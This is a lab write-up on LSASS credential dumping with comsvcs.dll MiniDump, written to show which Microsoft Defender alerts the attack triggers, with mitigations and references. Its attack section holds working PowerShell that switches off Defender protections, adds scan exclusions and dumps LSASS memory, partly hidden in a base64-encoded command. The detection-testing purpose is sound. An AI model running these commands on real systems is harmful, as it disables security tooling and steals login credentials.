# LSASS dumping, MiniDump
Hackers might target LSASS to grab login credentials stored in its memory. 
After a user logs in, LSASS stores important credential info that can be stolen by attackers to move through a system using different authentication details.

Microsoft Defender for Endpoint and Defender Antivirus effectively prevent and detect LSASS dumping activities. 
Now, I'd like to demonstrate the detection perspective by ***capturing all activities and correlating multiple alerts into a single incident***.

## Red Note (test insights)
**PowerShell, LSASS credential dumping, Built-in Windows tool** 
```powershell
$lsassPID = (Get-Process -Name lsass).Id
cmd.exe /C "C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID C:\temp\out.dmp full" 
```

**Attack Script**
- [x] Download a script ↓

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -ExclusionPath "C:\" -DisableBlockAtFirstSeen $true -DisableEmailScanning $true -DisableScriptScanning $true -ExclusionExtension "exe"
    
$tempDir = "C:\temp"

if (-not (Test-Path $tempDir -PathType Container)) {
        New-Item -Path $tempDir -ItemType Directory
}
    
powershell.exe -e JABsAHMAYQBzAHMAUABJAEQAIAA9ACAAKABHAGUAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABsAHMAYQBzAHMAKQAuAEkAZAANAAoAYwBtAGQALgBlAHgAZQAgAC8AQwAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAHIAdQBuAGQAbABsADMAMgAuAGUAeABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGMAbwBtAHMAdgBjAHMALgBkAGwAbAAsACAATQBpAG4AaQBEAHUAbQBwACAAJABsAHMAYQBzAHMAUABJAEQAIABDADoAXAB0AGUAbQBwAFwAbwB1AHQALgBkAG0AcAAgAGYAdQBsAGwAIgA=
```
> [!Note]
> This script will perform the following actions:
> 1. Disable Microsoft Defender Antivrus tool
> 2. Create "C:\temp" for a dump file
> 3. LSASS dumping using the built-in Windows tool (Encoded by Base64)
> 
> Make sure that [MDE Tamper Protection](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide&ocid=magicti_ta_learndoc) is disabled.

## Alerts & Detections
After running the script, these alerts were generated and correlated into a single incident in Microsoft Defender XDR portal.
- [x] Suspicious PowerShell command line
- [x] Sensitive credential memory read
- [x] Suspicious process executed PowerShell command
- [x] Suspicious access to LSASS service
- [x] Process memory dump
- [x] Suspicious Process Discovery
- [x] Suspicious Microsoft Defender Antivirus exclusion
- [x] Attempt to turn off Microsoft Defender Antivirus protection

## Blue Note
- Turn on [Microsoft Defender Antvirus](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/next-generation-protection?view=o365-worldwide) (Including Real-Time Protection, Cloud Protection, Sample Submission and so on)
- Turn on [Tamper Protection](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide&ocid=magicti_ta_learndoc)
- Onboarding [Microsoft Defender for Endpoint](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-endpoint?view=o365-worldwide)

## Reference
- [OS Credential Dumping: LSASS Memory, T1003.001](https://attack.mitre.org/techniques/T1003/001/)
- [Detecting and preventing LSASS credential dumping attacks](https://www.microsoft.com/en-us/security/blog/2022/10/05/detecting-and-preventing-lsass-credential-dumping-attacks/)

#### Disclaimer
The views and opinions expressed herein are those of the author and do not necessarily reflect the views of company.
